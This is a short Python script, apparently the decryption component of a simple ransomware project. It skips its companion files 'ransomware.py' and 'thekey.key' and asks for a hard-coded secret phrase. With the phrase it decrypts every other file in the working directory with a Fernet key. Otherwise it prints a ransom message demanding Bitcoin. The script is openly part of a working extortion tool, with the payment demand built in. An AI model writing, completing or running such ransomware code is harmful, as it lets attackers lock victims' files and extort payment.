import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "ransomware.py" or file == "thekey.key" or file == "decrypt_file.py":
            continue
    if os.path.isfile(file):
       files.append(file)

print(files)

super_phrase = "blackadam"

user_phrase = input("Enter the Secret Phrase for decryption:- \n")

if user_phrase == super_phrase:

    with open("thekey.key",'rb') as key:
         super_key = key.read() 

    for file in files:
        with open(file,'rb') as thefile:
             contents = thefile.read()
        content_decrypted = Fernet(super_key).decrypt(contents)
        with open(file,'wb') as thefile:
             thefile.write(content_decrypted)

    print(".........Decryption Completed Successfully............") 
else:
    print("**********Without Bitcoin No Chance to get Secret Phrase*************")
